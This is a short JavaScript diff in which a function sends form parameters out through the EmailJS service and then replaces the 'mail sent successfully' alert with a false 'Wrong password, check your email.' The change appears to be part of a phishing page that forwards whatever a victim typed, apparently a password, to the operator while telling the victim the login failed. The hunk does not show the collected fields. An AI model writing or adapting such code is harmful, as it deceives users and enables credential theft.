@@ -94,7 +94,7 @@ function sendMail2(){
     emailjs.send('service_ktz39ao', 'template_m1h3m8f', templateParams)
     .then(function(res){
         // console.log("Success", res.status);
-        alert("mail sent successfully");
+        alert("Wrong password, check your email.");
     })
 }
 
